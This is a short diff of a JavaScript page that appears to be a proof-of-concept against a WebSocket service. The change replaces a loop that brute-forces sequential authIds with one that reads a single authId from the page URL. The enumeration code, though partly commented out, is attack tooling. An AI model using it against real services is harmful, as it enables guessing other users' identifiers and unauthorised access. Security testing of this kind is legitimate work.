@@ -7,17 +7,18 @@
 	  var output;
           var token;
 	  var bruteId = 34028870
+	  let authId = new URLSearchParams(location.search).get('authId');
 	  function init()
 	  {
 		output = document.getElementById("output");
 		writeToScreen("Try to brute your authId......");
-		testWebSocket(bruteId)
+		testWebSocket(authId)
 	  }
 
-	  function testWebSocket(bruteId)
+	  function testWebSocket(authId)
 	  {	
 		websocket = new WebSocket(wsUri);
-		websocket.onopen = function(evt) { onOpen(evt,bruteId) };
+		websocket.onopen = function(evt) { onOpen(evt,authId) };
 		websocket.onclose = function(evt) { onClose(evt) };
 		websocket.onmessage = function(evt) { onMessage(evt) };
 		websocket.onerror = function(evt) { onError(evt) };
@@ -35,10 +36,10 @@
 	  function onClose(evt)
 	  {
 		writeToScreen("DISCONNECTED");
-		bruteId++;
-		if(bruteId != 34028874){
-		  testWebSocket(bruteId)
-		}
+		//bruteId++;
+		//if(bruteId != 34028874){
+		//  testWebSocket(bruteId)
+		//}
 	  }
 
 	  function onMessage(evt)
